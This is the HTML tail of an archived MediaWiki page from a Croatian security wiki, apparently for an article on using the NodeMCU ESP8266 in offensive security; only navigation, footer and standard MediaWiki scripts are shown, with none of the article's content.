+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="./Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti&amp;oldid=40451" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 16:16, 17. siječnja 2017.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 11.183 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Internet_of_Wrongs:_NodeMCU_ESP8266_SoC_u_ofenzivnoj_sigurnosti", "wgTitle": "Internet of Wrongs: NodeMCU ESP8266 SoC u ofenzivnoj sigurnosti", "wgAction": "view", "wgArticleId": 9215, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 40451, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 1.304 secs. -->			</body>
+</html>
